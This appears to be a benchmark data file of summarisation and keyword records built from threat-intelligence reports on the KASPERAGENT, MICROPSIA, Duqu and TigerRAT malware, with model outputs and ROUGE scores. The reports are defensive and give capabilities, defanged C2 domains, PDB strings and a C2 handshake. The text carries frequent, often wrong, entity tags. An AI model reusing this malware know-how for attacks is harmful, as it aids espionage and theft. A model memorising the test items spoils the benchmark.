attacks are not highly sophisticated , but the themes used , organizations and geographies targeted , as well the persistence of the attacker suggest a determined and noteworthy adversary . Some of this activity has been covered in a recent post by [CARDINAL] 360 security ( url however there is still a great deal of extra detail we are able to add in this report . Starting in [DATE] March [DATE] 2016 , [ORG] Palo [ORG] Alto [ORG] Networks began monitoring this threat following the successful prevention of the execution of a sample of the [GPE] KASPERAGENT malware on a customer system , however the malware had likely already been used in attacks [DATE] as [DATE] early [DATE] as July , [DATE] 2015 . At the time of writing , we have uncovered:113 samples of the [GPE] KASPERAGENT malware [CARDINAL] 94 samples of the [LOC] MICROPSIA malware [CARDINAL] 17 samples of [ORG] Android [ORG] Malware which are related to this activity . [CARDINAL] 39 command and control domains registered in relation to this activityMost of the attacks discovered so far target users in [GPE] the [GPE] United [GPE] States , [GPE] Israel , [LOC] Palestinian [LOC] Territories , and [GPE] Egypt ; although there are occasional outliers . Notable outliers include media organizations in a variety of countries . This post will begin by exploring how the attackers attempt to gain a foothold into target networks before brie\ufb02y describing the malware families used . One Bit.ly at a time This group of attackers favors using URL shortening services to disguise the true links they are sending in spear phishing emails . In particular , a number of samples we analyzed were linked via the URL shortening service \u201c bit.ly \u201d . The URL shortening service then redirects users to the malicious payload hosted on attacker controlled pages , with the malicious payload nearly always contained in an archive \ufb01le ( most commonly a [ORG] RAR \ufb01le . ) Using the statistics provided by these link - shortening services , we can gain an immediate insight into the targets clicking these links : Figure [CARDINAL] 1 : The bit.ly statistics for a link to a dropper for the [LOC] MICROPSIA malware family . The statistics vary per link , suggesting di\ufb00erent target audiences for di\ufb00erent waves of spear phishing . For example , the statistics shown in Figure [CARDINAL] 1 the campaign targeted [CARDINAL] 113 users in [GPE] Egypt , whereas in another example shown in Figure [CARDINAL] 2 , [GPE] Egypt did not make the top [CARDINAL] 3 countries targeted : Figure [CARDINAL] 2 : The bit.ly statistics for another link to a copy of the [LOC] MICROPSIA malware family FAKE NEWS ! Sending spear phishing emails with direct links to malicious shortened URLs was not the only method employed by the attackers to entice users to install the malware , another method favored by the attackers was the setting up of fake news sites . Figure [CARDINAL] 3 shows examples of pages created by the attackers to this end . Figure [CARDINAL] 3 : [CARDINAL] Two fake new sites with links to shortened malicious URLs . We are unable to con\ufb01rm how tra\ufb03c was driven to these sites , the attackers may have helped drive tra\ufb03c via fake social media accounts , or they may have sent spear phishing links to these pages . [PERSON] Malware [PERSON] Analysis : [PERSON] MICROPSIA , [PERSON] KASPERAGENT and the missing link During our analysis , we discovered [CARDINAL] two distinct malware families which for the most part leveraged distinct infrastructure with no overlaps , initially leading us to categorize these campaigns separately . Later , we discovered a key link between the [CARDINAL] two sets of activity which leads us to believe they are related . The [ORG] MICROPSIA activity centers around domains registered using the email address adam.swift.2016@gmail[.]com \u2013 and no samples of [PERSON] KASPERAGENT talk to these domains . However , [CARDINAL] one of the domains ( drive.acount - manager[.]net ) registered by this [GPE] KASPERAGENT , causing us to link the [CARDINAL] two sets of activity . [PERSON] KASPERAGENT We have named the most common malware involved in this campaign , [PERSON] KASPERAGENT , due to [ORG] PDB strings left behind in many samples of the malware . An example of a [ORG] PDB string left behind is given below : [CARDINAL] 1 c:\\Users\\USA\\Documents\\Visual Studio [DATE] 2008\\Projects\\New folder ( [CARDINAL] 2)\\kasper\\Release\\kasper.pdb This analysis is based on the following \ufb01le : The malware also drops a decoy document containing [NORP] Arabic names and ID numbers to the same folder and displays it to the user . [PERSON] KASPERAGENT is developed in [LOC] Microsoft [LOC] Visual [LOC] C++ and attempts to disguise itself as a product that does not exist : \u201c Adobe Cinema Video Player \u201d . The malware \ufb01rst establishes persistence using the classic method of adding a [PERSON] Run key , using the value \u201c MediaSystem \u201d . The malware connects to a [CARDINAL] C2 serverhosted on www.mailsinfo[.]net . The [CARDINAL] C2 server string in the binary is \u201c obfuscated \u201d in the most basic of senses , with the author adding \u2018 @ \u2019 characters between letters and splitting the starting \u201c www.m \u201d to another string . Figure [CARDINAL] 4 : The [ORG] Command and [NORP] Control domain is obfuscated using a basic technique Most of the samples of [PERSON] KASPERAGENT use \u201c [WORK_OF_ART] Chrome \u201d as the user agent , but this recent sample uses \u201c OPAERA \u201d , possibly a misspelling of \u201c Opera \u201d , the browser . The malware communicates with the [CARDINAL] C2 server via HTTP requests and in the most recent samples observed the callbacks are made to [ORG] PHP scripts whose names relate to towns or navigation . Example URLs used include : GET request to /dad5 / town.php [ORG] POST request to /dad5 / addCity.php and /dad5 / sign.phpMost examples of the malware are nearly identical , and the malware simply acts as a basic reconnaissance tool and downloader for further payloads , however some examples of the malware include extended capabilities beyond that of a simple downloader . Take screenshots [ORG] Recording user keystrokes Ex\ufb01ltrate basic environment information such as the username and computer name [ORG] Perform arbitrary commands [PERSON] Enumerate removable drives and copy \ufb01les of interest to a new folder for ex\ufb01ltration Update the malware to a new version Ex\ufb01litrate arbitrary \ufb01les ( zip compressed and encrypted)It \u2019s also worth mentioning that sometimes that both versions of the malware are wrapped in a [ORG] Microsoft .NET Framework loader which is responsible for deploying the malware and displaying the decoy document . The author ( imaginatively ) calls this wrapper contains the [ORG] PDB string : C:\u29f5Users\u29f5Yousef\u29f5Desktop\u29f5MergeFiles\u29f5Loader v0\u29f5Loader\u29f5obj\u29f5Release\u29f5Loader.pdb MICROPSIA Analysis The MICROPSIA malware family is written in [GPE] Delphi ( url and is an information stealing malware family with a wide range of data theft functionality built in . This analysis is based on the following We named the malware MICROPSIA because of the way it is often packaged . The malware is often delivered as a [ORG] RAR , which once extracted contains an [ORG] EXE , which is further packed using [ORG] UPX . Once unpacked from UPX , the next level is a further SFX RAR \ufb01le , which then contains the actual malware \ufb01les within . This e\ufb00ectively means the initial payload is extremely compressed andappears much smaller than it really is . ( url The \ufb01nal payload contains [CARDINAL] four legitimate executables as resources:1 . [CARDINAL] Two embedded DLLs relating to the OpenSSL library used for tra\ufb03c encryption . [CARDINAL] 2 . A copy of a command line version of WinRAR \u2013 used for encrypting and compressing the ex\ufb01ltrated data [CARDINAL] 3 . The \ufb01le \u2018 shortcut.exe \u2019 from optimumx.com ( Creates , modi\ufb01es or queries Windows shell links)this is used for persistence by creating a link in the startup folder to the payload . The malware begins execution by \ufb01rst copying itself to a prede\ufb01ned location , setting up persistence via an [ORG] LNK \ufb01le ( hence the inclusion of the aforementioned shortcut.exe ) The main capabilities of the malware are as follows : Logging of keystrokes to a hardcoded text \ufb01le and ex\ufb01ltration to a remote server [ORG] Capturing screenshots of the infected machines Searching for \ufb01les with extensions matching [ORG] Microsoft [ORG] O\ufb03ce documents and using WinRAR to archive these prior to The value \u201c d58ccc009be55\ufb00172a9039bf35cf27 \u201d is used to encrypt ex\ufb01ltrated documents and appears to be an MD5 hash , but we have not identi\ufb01ed a string that maps to this hash . A side of phishing Interestingly in some cases the attackers combined an attempt to infect targeted users with malware , with an attempt to steal their credentials via traditional phishing techniques . The attackers sometimes directed users to sites spoo\ufb01ng legitimate services such as [FAC] Google [FAC] Drive to download the malware , however \ufb01rst the target users would be asked to \ufb01ll in their credentials in , giving the attackers [CARDINAL] two chances to successfully steal target users \u2019 data ( via the phish and via the eventual malware infection):Figure [CARDINAL] 5 : In some cases , users were required to \ufb01ll in their credentials to download the malware And there \u2019s an [ORG] APK twist \u2026 Whilst a large number of the domains associated with the [ORG] adam.swift.2016@gmail[.]com email address are associated with MICROPSIA samples , some have been observed hosting Android apps or acting as [CARDINAL] C2 domains for [ORG] Android malware samples . Analysis of these apps shows these are also malicious , and the apps also contain some social engineering tricks to enable installation . There are [CARDINAL] two main [ORG] APK malware families used by the threat actor . The \ufb01rst is a malware family used to gain a foothold on to the device , it is e\ufb00ectively a downloader with no additional functionality and we call this malware SECUREUPDATE.Figure [CARDINAL] 6 : The applications often pretend to be social applications popular with end users . calendar to sleep , creating an alarm in the future , at which point the malware would call back to receive an \u201c [WORK_OF_ART] Update\u201d:Figure [WORK_OF_ART] 7 : The alarm functionality in the SECUREPDATE malware was used to download and execute a further payload at a later date . In a similar vein to the \u2018 a side of phishing \u2019 section , some of the versions of SECUREUPDATE backdoor attempt to steal credentials for users , making them create accounts for these fake apps in addition to the installation of the malware . This technique relies on credential re - use across many accounts but will still yield some success for the attackers : Figure [CARDINAL] 8 : Some of the apps require users to \u201c Login \u201d giving the attacker the chance to record credentials of victims that may well be reused elsewhere . The [ORDINAL] second malware family is a malware family we call VAMP , which is already described in great detail ( url\ufb01le / APTSWXLVJ8fnjoxck.pdf ) in the blog by [CARDINAL] 360 , [ORG] VAMP is fully featured with all the capabilities you \u2019d expect from a malware family that resides on a phone . Features of the malware include : Ability to record calls Contact theft Theft of documents stored on the device Theft of messagesAnother outlier in terms of domains registered by [ORG] adam.swift.2016@gmail[.]com is the domain AppPure[.]info . From the outset , the site appears to be a legitimate page : Figure [CARDINAL] 9 : The app store created by the attackers which we believe was used to distribute malicious apps . Although we have been unable to \ufb01nd malicious content hosted on this site , we believe that it is very likely that amongst the many legitimate apps available for download via this store some malicious apps may exist . Concluding thoughts Through this campaign there is little doubt that the attackers have been able to gain a great deal of information from their targets . We have been unable to uncover any evidence which allows us to con\ufb01dently attribute this campaign to any known threat actor at present . The scale of the campaign in terms of sheer numbers of samples and the maintenance of several di\ufb00ering malware families involved suggests a reasonably sized team and that the campaign is not being perpetrated by a lone wolf , but rather a small team attackers . The campaign also illustrates that for some targets old tricks remain su\ufb03cient to run a successful espionage campaign , including use of URL shortening services , classic phishing techniques as well as using archive \ufb01les to bypass some simple \ufb01le checks . [ORG] Palo [ORG] Alto [ORG] Networks customers are defended from this threat in the following ways : [ORG] WildFire and [ORG] Traps detect all of the malware discussed in this report as malicious . The [CARDINAL] C2 domains listed in this report are blocked through [ORG] Threat [ORG] Prevention . [ORG] AutoFocus customers can monitor this activity by looking at the tags : [PERSON] VAMP ( url#/tag / Unit42.Vamp ) [PERSON] KASPERAGENT ( url#/tag / Unit42.KasperAgent ) [PERSON] MICROPSIA ( url#/tag / Unit42.Micropsia ) SECUREUPDATE ( url#/tag / Unit42.SecureUpdate)Appendix A \u2013 Associated C2 Domains mediafreeuploader[.]co[.]uk al - amalhumandevelopment[.]com acount - manager[.]net gooogel - drive[.]com acount - manager[.]org acount - manager[.]info mary - crawley[.]com mydriveweb[.]com google - support - team[.]com mavis - dracula[.]com acount - manager[.]com ran - togomory[.]comshildon - cooper[.]info beauty - dance[.]net margaery[.]co go - mail - accounts[.]com kagami - adam[.]com cecilia - dobrev[.]com cecilia - gilbert[.]com gooogel[.]org feteh - asefa[.]com Appendix B \u2013 Associated Windows Malware Samples Appendix D \u2013 Observed PDB Strings C:\u29f5Users\u29f5USA\u29f5Documents\u29f5Visual [PERSON] Studio 2008\u29f5Projects\u29f5New folder ( [CARDINAL] 2)\u29f5kasper\u29f5Release\u29f5kasper.pdb C:\u29f5Users\u29f5Yousef\u29f5Desktop\u29f5MergeFiles\u29f5Loader v0\u29f5Loader\u29f5obj\u29f5Release\u29f5Loader.pdb c:\u29f5Users\u29f5USA\u29f5Documents\u29f5Visual [PERSON] Studio 2008\u29f5Projects\u29f5New folder ( 2)\u29f5s7 \u2013 Copy \u2013 Copy 19-2-17\u29f5Release\u29f5s7.pdb c:\u29f5Users\u29f5USA\u29f5Documents\u29f5Visual [PERSON] Studio 2008\u29f5Projects\u29f5New folder ( 2)\u29f5s7\u29f5Release\u29f5s7.pdb C:\u29f5Users\u29f5Progress\u29f5Desktop\u29f5Loader v0\u29f5Loader\u29f5obj\u29f5Release\u29f5Loader.pdb D:\u29f5Merge\u29f5Debug\u29f5testproj.pdb c:\u29f5Users\u29f5USA\u29f5Documents\u29f5Visual [PERSON] Studio 2008\u29f5Projects\u29f5New folder ( 2)\u29f5kasper \u2013 Copy \u2013 [CARDINAL] 21-2-17\u29f5Release\u29f5kasper.pdb C:\u29f5Users\u29f5Yousef\u29f5Desktop\u29f5MergeFiles\u29f5merge photos\u29f5Loader v0\u29f5Loader\u29f5obj\u29f5Release\u29f5Loader.pdb C:\u29f5Users\u29f5Yousef\u29f5Desktop\u29f5Loader v0\u29f5Loader\u29f5obj\u29f5Release\u29f5Loader.pdbGot something to say?Leave a comment [GPE] Notify me of followup comments via e - mailName ( [ORG] required)Email ( required)WebsiteSUBMIT", "generated_text": "research; Palo Alto Networks; targeted attacks; the Middle East; two new Microsoft Windows malware families; Kaspersky Lab; MICROPSIA; the malware; strings; the malware; the malware; the attacker; a small device; Micropsia; its malicious updates; a secure update; VAMP; data; the attacker; the malware; the attacks; organizations; geographies; the persistence; a determined and noteworthy adversary; the Middle East.", "ref_text": "<START-1>The document describes targeted cyberattacks in the Middle East using two new Microsoft Windows malware families named KASPERAGENT and MICROPSIA. The malware has been used in attacks since at least July 2015, primarily targeting users in the United States, Israel, Palestinian Territories, and Egypt. KASPERAGENT is basic reconnaissance malware that establishes persistence on infected machines and acts as a downloader for further payloads. Some versions have extended capabilities like password stealing, screenshots, and exfiltration. The malware communicates with command and control servers like mailsinfo[.]net. MICROPSIA is written in Delphi and has extensive spying capabilities including keylogging, screenshotting, and document exfiltration. It uses encryption and other tactics to hide its C2 communications. The malware is linked to domains registered with the email adam.swift.2016@gmail.com. The attackers distributed the malware via spear phishing using shortened URLs and fake news websites. The phishing messages often contain politically-themed decoy documents of interest to targets in the region. Threat intelligence reveals links between the Windows malware and two new Android malware families called SECUREUPDATE and VAMP. They use similar infrastructure and targeting. In summary, the report provides extensive technical details on the KASPERAGENT and MICROPSIA malware families used in targeted attacks in the Middle East. It explores the distribution methods, capabilities, infrastructure, and potential targets of the malware campaign. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.42388059701492536, "gpt3/lexical/rouge_rouge2": 0.21621621621621623, "gpt3/lexical/rouge_rougeL": 0.2567164179104478, "gpt3/lexical/rouge_rougeLsum": 0.2567164179104478, "gpt3_generated_text": ["In a joint research effort between Unit 42 and ClearSky Cyber Security, Palo Alto Networks has uncovered evidence of targeted attacks in the Middle East using two new Microsoft Windows malware families, KASPERAGENT and MICROPSIA. Additionally, there are links between these malware families and two Google Android malware families, SECUREUPDATE and VAMP. The attacks, while not highly sophisticated, target users in the United States, Israel, Palestinian Territories, and Egypt, with occasional outliers such as media organizations in various countries. The attackers use URL shortening services to disguise malicious links in spear phishing emails, with the malicious payload contained in an archive. This research sheds light on the persistence and determination of the adversary behind these attacks."]}, {"split_name": "test", "sample_id": "test_67", "prompt_text": "Extract the keywords: [PERSON] Duqu [PERSON] Trojan [PERSON] Questions [PERSON] and [PERSON] Answers [PERSON] URL : url Date : [DATE] October 26 , [DATE] 2011 Author : SecureWorks Counter Threat Unit Research Team The Dell SecureWorks Counter Threat UnitSM ( CTU ) research team has been analyzing an emerging malware threat identified as the [ORG] Duqu trojan . This [GPE] Trojan horse has re- ceived a great deal of attention because it is similar to the infamous Stuxnet worm of [DATE] 2010 . This report includes answers to questions about this threat . CTU researchers have put countermeasures in place to detect [ORG] Duqu C2 traffic , and they continue to monitor for new [ORG] Duqu samples and update protections as needed . What is Duqu ? The [ORG] Duqu trojan is composed of several malicious files that work together for a mali- cious purpose . The [ORDINAL] first component is a Windows kernel driver that searches for and loads encrypted dynamic link library ( [ORG] DLL ) files . The decrypted [ORG] DLL files implement the main payload of [ORG] Duqu , which is a remote access trojan ( RAT ) . The [ORG] RAT allows an adversary to gather information from a compromised computer and to download and run additional programs . In addition to the [ORG] RAT , another piece of malware was recovered with [ORG] Duqu in [CARDINAL] one in- stance . This malware is an information stealer designed to log user keystrokes and other information about the infected system . This piece of malware is believed to be related due to programming similarities with the main [ORG] Duqu executables . What is the relationship to Stuxnet ? There has been much speculation that [ORG] Duqu is a new version of Stuxnet or that it was written by the same authors . There are several factors that could influence these specu- lations : Duqu and Stuxnet both use a kernel driver to decrypt and load encrypted [ORG] DLL ( Dynamic Load Library ) files . The kernel drivers serve as an \" injection \" engine to load these DLLs into a specific process . This technique is not unique to either Duqu or Stuxnet and has been observed in other unrelated threats . Encrypted [ORG] DLL files are stored using the .PNF extension . This is normally the ex - tension [ORG] Microsoft [PRODUCT] Windows uses for precompiled setup information files . The com- monality exists due to the kernel driver implementation being similar . The kernel drivers for both Stuxnet and [ORG] Duqu use many similar techniques for en- cryption and stealth , such as a rootkit for hiding files . Again , these techniques are not unique to either Duqu or Stuxnet and have been observed in other unrelated threats . Both Stuxnet and [ORG] Duqu have variants where the kernel driver file is digitally signed using a software signing certificate . [CARDINAL] One variant of the [ORG] Duqu kernel driver was signed by a certificate from C - Media [ORG] Electronics [ORG] Incorporation . An unsigned [ORG] Duqu kernel driver claimed to be a driver from [ORG] the [ORG] JMicron [ORG] Technology [ORG] Company , which was the same company whose software signing certificate was used to sign one of the Stuxnet kernel driver files . The commonality of a software signing cer- tificate is insufficient evidence to conclude the samples are related because compro- mised signing certificates can be obtained from a number of sources . One would have to prove the sources are common to draw a definitive conclusion . Attribute Infection MethodsDropper CharacteristicsZero - days used [ORG] Command and [PERSON] ControlDuqu [PERSON] Unknown [PERSON] Installs signed kernel drivers to decrypt and load [ORG] DLL files None yet identified [CARDINAL] Four HTTP , [ORG] HTTPS , [ORG] Custom [ORG] HTTPStuxnet USB ( [ORG] Universal [ORG] Serial [ORG] Bus ) [ORG] PDF ( Portable Document Format)Installs signed kernel drivers to decrypt and load [ORG] DLL filesSelf propagationNone yet identifiedData exfiltrationAdd - on , keystroke logger for user and system info stealingDate triggers to infect or exit Uninstalls self after [CARDINAL] 36 Interaction with control systemsNonedaysP2P ( [PERSON] Peer to Peer ) using RPCs ( Remote Procedure Call ) Network Shares WinCC Databases ( Siemens)Built - in , used for versioning and updates of the malwareHard coded , must be in the following [GPE] Highly sophisticated interaction with [ORG] Siemens [ORG] SCADA control systemsTable [CARDINAL] 1 . [ORG] Comparison [ORG] of [ORG] Duqu [ORG] and [ORG] Stuxnet . Both Duqu and Stuxnet are highly complex programs with multiple components . All of the similarities from a software point of view are in the \" injection \" component imple- mented by the kernel driver . The ultimate payloads of Duqu and Stuxnet are significant- ly different and unrelated . One could speculate the injection components share a com- mon source , but supporting evidence is circumstantial at best and insufficient to con- firm a direct relationship . The facts observed through software analysis are inconclusive at publication time in terms of proving a direct relationship between Duqu and Stuxnet at any other level . Does Duqu target industrial control systems ? Unlike Stuxnet , [ORG] Duqu does not contain specific code that pertains to supervisory control and data acquisition ( [ORG] SCADA ) components such as programmable logic controllers ( PLCs ) . [ORG] Duqu 's primary purpose is to provide an attacker with remote access to a com- promised computer , including the ability to run arbitrary programs . It can theoretically be used to target any organization . Is there any evidence in the code indicating specific targets ? Duqu facilitates an adversary 's ability to gather intelligence from an infected computer and the network . CTU malware analysts have not identified any specific market seg- ments , technologies , organizations or countries that are targeted by the [ORG] Duqu malware . What are indicators of a [ORG] Duqu infection ? The [ORG] Duqu trojan attempts to use the network to communicate with a remote command and control ( C2 ) server to receive instructions and to exfiltrate data . Analysis of Duqu cated in [GPE] India and has been shut down by the hosting provider . Also , [ORG] Duqu may at- tempt to resolve the kasperskychk.dyndns.org domain name . The resulting [ORG] IP address is not used for communications , so this lookup may serve as a simple Internet connectivity check . Administrators should monitor their network for systems attempting to resolve this domain or connect to the C2 IP address for possible infection . Duqu uses multiple protocols to communicate with its [CARDINAL] C2 server , including standard HTTP on [ORG] TCP port [CARDINAL] 80 and a custom protocol on [ORG] TCP port [CARDINAL] 443 . Some of [ORG] Duqu 's commu- nications that use [ORG] TCP port [CARDINAL] 443 do not use the HTTPS protocol . Organizations may be able to monitor egress traffic through proxy servers or web gateways and investigatenetwork traffic that does not conform to the [ORG] SSL ( [ORG] Secure [ORG] Sockets [ORG] Layer ) specification . Non - SSL traffic on port [CARDINAL] 443 is commonly observed with other threats , and this behavior is not exclusive to [ORG] Duqu . The CTU research team is aware of the following files that may be installed by the [ORG] Duqu trojan . The byproducts in [LAW] Table [LAW] 2 have been collected from multiple Duqu variants and would not be present on a single infected computer . [PERSON] MD5File [PERSON] Size [CARDINAL] 6,750 bytes [CARDINAL] 6,750 bytesName [CARDINAL] 24,960 bytes iaStor451.sysTable [CARDINAL] 2 . Byproducts of Duqu . The name \" Duqu \" was assigned to this malware because the keylogger program creates temporary files that begin with the prefix \" [GPE] ~DQ \" . A computer infected with [ORG] Duqu may have files beginning with \" ~DQ \" in Windows temporary directories . How do Duqu infections occur ? The mechanism by which [ORG] Duqu infections occur is unknown . Current analysis of [ORG] Duqu has not revealed any ability to infect additional systems like the Stuxnet worm could . In addition , all of the [ORG] Duqu files CTU researchers have analyzed would likely have been installed by an initial installer or \" dropper \" malware . None of the original installers have been recovered . The recovery of [CARDINAL] one of these installers may help provide clues to how [ORG] Duqu infections occurred . Is Duqu an advanced persistent threat ( APT)?Dell SecureWorks does not identify individual tools as [ORG] APT . [ORG] APT is a threat actor or ac- tors targeting an organization for assets of interest . An [ORG] APT involves planning by the adversary , teams with specialized roles , multiple tools , patience and persistence . While [ORG] Duqu does provide capabilities used by other tools observed in [ORG] APT - related intrusions , an assessment of the particular threat requires knowledge of the adversary , targeted or- ganization and assets and the scope of attacks . Is antivirus and antimalware protection sufficient for detecting [ORG] Duqu ? Since its discovery , security vendors have worked to improve their ability to detect [ORG] Duqu . However , the author may simply release newer variants that are no longer de- tected by antivirus and antimalware products . What can I do to protect my organization from Duqu?Administrators should use host - based protection measures , including antivirus and antimalware , as part of a holistic security process that includes network - based monitoring and controls , network segmentation and policies , user access , and con- trols to help mitigate the threat of malware like [ORG] Duqu . A computer infected with [ORG] Duqu may have files beginning with \" ~DQ \" in Windows temporary directories . Organizations may want to monitor egress traffic through proxy servers or web gateways and investigate network traffic that does not conform to the [ORG] SSL ( [ORG] Secure [ORG] Sockets [ORG] Layer ) specification . Non - SSL traffic on port [CARDINAL] 443 is commonly observed with other threats , and this behavior is not exclusive to [ORG] Duqu . Administrators should monitor their network for systems attempting to resolve Duqu - related domains or connect to Duqu C2 IP addresses for possible infection .", "generated_text": "Dell SecureWorks; an emerging malware threat; Duqu; a Windows kernel driver; files; encrypted dynamic link library; files; the main payload; a remote access trojan; a remote access trojan; RAT; information; the RAT; the Duqu program; similarities; programs; a rootkit; addition; the malware; information stealer; User; keystrokes; system info; The kernel driver; encryption; en- cryption; stealth; control; the code; similarities; the Stuxnet worm; the main Duqu executables.", "ref_text": "<START-1>Here is a summary of the Duqu Trojan Questions and Answers PDF: The PDF provides an overview and analysis of the Duqu trojan malware threat discovered in 2011. Duqu is composed of a Windows kernel driver that loads encrypted DLLs implementing a remote access trojan (RAT) payload. An additional information stealing module logs keystrokes and system data. While there are some similarities between Duqu's kernel driver injection techniques and those used in Stuxnet, analysis shows the ultimate payloads are very different. The evidence is insufficient to definitively prove Duqu and Stuxnet come from the same source. Duqu does not target industrial control systems like Stuxnet. Duqu's main purpose is to provide an attacker with remote access and the ability to run arbitrary code on a victim system. No specific targets are evident in the code. Indicators of infection include network connections to Duqu command and control servers, DNS lookups for Duqu domains, presence of files named \"~DQ\", and non-SSL traffic over port 443. Protection measures include monitoring network connections and egress traffic, detecting Duqu-related files, and using antivirus, antimalware and host-based security controls. However, Duqu variants can bypass antivirus detection. holistic security encompassing network controls and monitoring, segmentation, access controls and policies is recommended. In summary, Duqu is a remote access trojan exhibiting some technical similarities to Stuxnet but lacking specifics linking it to ICS attacks. It provides flexible malware capabilities allowing an attacker to control compromised systems. Ongoing monitoring, network security controls, and host protections can help mitigate the threat. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4727272727272728, "gpt3/lexical/rouge_rouge2": 0.1618798955613577, "gpt3/lexical/rouge_rougeL": 0.2545454545454545, "gpt3/lexical/rouge_rougeLsum": 0.2545454545454545, "gpt3_generated_text": ["The article discusses an emerging malware threat called Duqu, which is similar to the infamous Stuxnet worm. Duqu is composed of several malicious files, including a Windows kernel driver and encrypted dynamic link library (DLL) files. The DLL files implement the main payload of Duqu, which is a remote access trojan (RAT) that allows an adversary to gather information from a compromised computer and run additional programs. Duqu also includes an information stealer that logs user keystrokes and other system information. While there are similarities between Duqu and Stuxnet in terms of their use of kernel drivers and encryption techniques, the ultimate payloads of the two malware programs are significantly different and unrelated. It is unclear at this time whether Duqu specifically targets industrial control systems like Stuxnet did."]}, {"split_name": "test", "sample_id": "test_68", "prompt_text": "Extract the keywords: TigerRAT \u2013 Advanced Adversaries on [DATE] the [DATE] Prowlblogs.vmware.com/security/2021/12/tigerrat-advanced-adversaries-on-the-prowl.htmlDecember [DATE] 3 , [DATE] 2021SummaryOn [DATE] September 5th , [DATE] 2021 , [ORG] the [ORG] Korea [ORG] Internet [ORG] & [ORG] Security [ORG] Agency ( [ORG] KISA ) released a report on a new threat they dubbed TigerRAT . The newly found malware shares similarities with malware previously reported by [ORG] Kaspersky and [GPE] Malwarebytes . [PERSON] Kaspersky has previously attributed those malware samples to [ORG] Andariel , a threat actor group [ORG] the [ORG] Korean [ORG] Financial [ORG] Security [ORG] Institute has identified as being a sub - group of [ORG] Lazarus . TigerRAT appears to have been used from [DATE] late [DATE] 2020 onwards . [ORG] VMware \u2019s [ORG] Threat [ORG] Analysis [ORG] Unit identifies TigerRAT as a payload associated with broader campaign of attacks against target enterprises . The TigerRAT payload capability includes the ability to manipulate files , execute remote commands , log keystrokes and remotely view and control the screen . TigerRAT may be blocked by [ORG] VMware [ORG] Carbon [ORG] Black ( see Figure [CARDINAL] 8).Notably this malware , and the overall attack , originates from a loader application that utilizes a unique approach to storing the payload . Within the TigerRAT sample , configuration data for [ORG] Command and Control ( C2 ) communications is stored encrypted within the malware , and communications with the [CARDINAL] C2 server are customized to appear like HTTP web traffic . [ORG] VMware \u2019s [ORG] Threat [ORG] Analysis [ORG] Unit performed a deep analysis of the TigerRAT malware to document its internal operations for comparison to other malware families in the wild . When considering how TigerRAT may be used in the wild , defenders should recognize that the TigerRAT malware will be used by attackers as part of a broader campaign of attacks and that along the kill - chain , a wide variety of other malware types and attack techniques are also likely to be used . This is a key point when evaluating how such campaigns can be detected and disrupted . LoaderLoader structureIn the case of sample , the TigerRAT payload data is stored in a section named \u201c data \u201d . The payload structure is a [QUANTITY] 4 - byte size , a 16 - byte key , and then base64 encoded data . The size is the total length of the base64 data.4 bytes16 bytesNN bytesSize of base64 encoded data ( NN ) Decryption key base64 encoded dataThe screenshot below ( Figure [CARDINAL] 1 ) shows the size in red , the decryption key in green , and the base64 data in blue.1/12Figure [CARDINAL] 1 : [ORG] LoaderLoader [ORG] functionThe Loader \u2019s purpose is to decrypt the final TigerRAT payload and execute it in memory . The data is loaded , base64 decoded and then the 16 - byte key is used to decrypt the data with a simple [WORK_OF_ART] XOR . The decoded payload is a [ORG] PE file and after decrypting the loader will jump to the entry point . [PERSON] Variance of loaders in the wild2/12The loader sample [GPE] Malwarebytes reported on had almost identical code to that analyzed here , with the notable difference being that the base64 data was stored as overlay data after all the regular [ORG] PE data . The embedded payload in the [PERSON] Malware bytes sample also differed . [PERSON] Refer to the [GPE] Malwarebytes post for additional detail . TigerRATThe embedded [ORG] PE is referred to as TigerRAT by the [PERSON] KISA report . A handful of different samples were found with compilation dates ranging from [DATE] the [DATE] end [DATE] of [DATE] 2020 to [DATE] the [DATE] beginning [DATE] of [DATE] 2021 , with the only notable differences between different samples being the encrypted C2 information , and the DES / RC4 keys used for encryption and decryption . The malware is written in [LANGUAGE] C++ and makes use of only a handful of classes . At startup , a main class is created with references to the classes below . Class nameDescriptionProtocolTcpPurePerforms all the communication with the C2 server . CryptorDESCryptorRC4Used to decrypt encrypted strings and data in the program . Used to encrypt information sent to the C2 server and decrypt received commands . IDGeneratorAdapterCreates a unique ID for the victim machine used during [CARDINAL] C2 communication initialization . ModuleUpdateHandles C2 commands related to shutting down and self - deletion . ModuleInformationHandles [CARDINAL] C2 commands related to gathering victim machine information . ModuleShellHandles C2 commands related to executing commands . ModuleFileManagerHandles [CARDINAL] C2 commands related to file manipulation and upload and download of files from the victim machine . ModuleKeyLoggerHandles [CARDINAL] C2 commands related to starting and stopping keylogging functionality . ModuleSocksTunnelHandles [CARDINAL] C2 commands related to starting and stopping a socks tunnel . ModuleScreenCapture Handles C2 commands related to remote screen capturing and keyboard eventinjection . ModulePortForwarder [PERSON] Handles [PERSON] C2 commands related to starting and stopping port forwarding . Table [CARDINAL] 1 : TigerRAT classesAll of the Module classes inherit from a common base class and the main class stores an array of [PERSON] Module instances that are used during [CARDINAL] C2 communication . The code makes heavy use of threading when running actions based on [CARDINAL] C2 commands . C2 CommunicationDuring the main class initialization , the C2 IP addresses are decrypted using the CryptorDES class and stored in the main class . When that initialization is finished , the malware then attempts to initiate the network connection to the [CARDINAL] C2 server . The malware [ORDINAL] first tries to connect to one of the decrypted C2 IP addresses on [PERSON] port3/12443 and then performs a handshake with the C2 server . The malware starts by sending [LAW] HTTP [LAW] 1.1 /index.php ? member = sbi2009 SSL3.3.7\\x00 and then the [CARDINAL] C2 server responds with HTTP [CARDINAL] 1.1 [CARDINAL] 200 OK SSL2.1\\x00.Following a successful initial handshake , the malware sends a 16 - byte hash of the RC4 key being used and expects to get back a hardcoded [QUANTITY] 7 - byte value . In the case of all currently found samples , the malware expects the [QUANTITY] 7 - byte value \u201c xPPygOn\u201d . The handshake process can be seen from the perspective of the C2 server by running a mockc2 TigerRAT server ( Figure [CARDINAL] 2).mockc2 > debug on [ + ] Debug output on mockc2 > listener start tigerrat [CARDINAL] 443 [ DEBUG ] Server listening [ i ] connection from x.x.x.x:55067 [ DEBUG ] received00000000 [DATE] 48 [DATE] 54 [DATE] 54 [DATE] 50 20 31 2e 31 20 2f 69 6e 64 65 78 [CARDINAL] 2e |HTTP [CARDINAL] 1.1 /index.| 00000010 70 68 70 [CARDINAL] 3f 6d 65 6d 62 65 72 3d 73 62 69 [CARDINAL] 